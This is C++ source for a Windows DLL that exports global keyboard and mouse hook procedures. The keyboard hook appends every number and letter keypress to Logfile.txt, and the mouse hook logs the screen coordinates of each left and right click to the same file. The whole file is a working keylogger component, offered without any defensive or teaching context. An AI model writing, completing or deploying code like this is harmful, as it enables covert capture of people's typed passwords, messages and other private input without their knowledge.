#include <windows.h>
#include <stdio.h>
#include <fstream>

HHOOK global;

//extern "C" makes a function-name in C++ have C linkage (compiler does not mangle the name) so that client C code can link to (use) your function using a C compatible header file that contains just the declaration of your function.
extern "C" __declspec(dllexport) LRESULT WINAPI procedureKeyboard(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {

        std::ofstream LogFile;
        LogFile.open("Logfile.txt", std::ios_base::app);

        //check key up flag not set
        if (!(HIWORD(lParam) & KF_UP)) {
            switch (wParam) {

                // Number keys
            case 0x30: LogFile << "0"; break;
            case 0x31: LogFile << "1"; break;
            case 0x32: LogFile << "2"; break;
            case 0x33: LogFile << "3"; break;
            case 0x34: LogFile << "4"; break;
            case 0x35: LogFile << "5"; break;
            case 0x36: LogFile << "6"; break;
            case 0x37: LogFile << "7"; break;
            case 0x38: LogFile << "8"; break;
            case 0x39: LogFile << "9"; break;

                // Letter leys
            case 0x41: LogFile << "a"; break;
            case 0x42: LogFile << "b"; break;
            case 0x43: LogFile << "c"; break;
            case 0x44: LogFile << "d"; break;
            case 0x45: LogFile << "e"; break;
            case 0x46: LogFile << "f"; break;
            case 0x47: LogFile << "g"; break;
            case 0x48: LogFile << "h"; break;
            case 0x49: LogFile << "i"; break;
            case 0x4A: LogFile << "j"; break;
            case 0x4B: LogFile << "k"; break;
            case 0x4C: LogFile << "l"; break;
            case 0x4D: LogFile << "m"; break;
            case 0x4E: LogFile << "n"; break;
            case 0x4F: LogFile << "o"; break;
            case 0x50: LogFile << "p"; break;
            case 0x51: LogFile << "q"; break;
            case 0x52: LogFile << "r"; break;
            case 0x53: LogFile << "s"; break;
            case 0x54: LogFile << "t"; break;
            case 0x55: LogFile << "u"; break;
            case 0x56: LogFile << "v"; break;
            case 0x57: LogFile << "w"; break;
            case 0x58: LogFile << "x"; break;
            case 0x59: LogFile << "y"; break;
            case 0x5A: LogFile << "z"; break;

            }
        }

        // Close the file
        LogFile.close();
    }
    return CallNextHookEx(global, nCode, wParam, lParam);
}

extern "C" __declspec(dllexport) LRESULT WINAPI procedureMouse(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {

        std::ofstream LogFile;
        LogFile.open("Logfile.txt", std::ios_base::app);

        //Extracting the data
        MOUSEHOOKSTRUCT* data = (MOUSEHOOKSTRUCT*)lParam;

        if (wParam == WM_LBUTTONDOWN) {
            LogFile << "Left Mouse click: " << "x: " << data->pt.x << " y: " << data->pt.y << std::endl;
        }
        else if (wParam == WM_RBUTTONDOWN) {
            LogFile << "Right Mouse click: " << "x: " << data->pt.x << " y: " << data->pt.y << std::endl;
        }

        // Close the file
        LogFile.close();
    }
    return CallNextHookEx(global, nCode, wParam, lParam);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}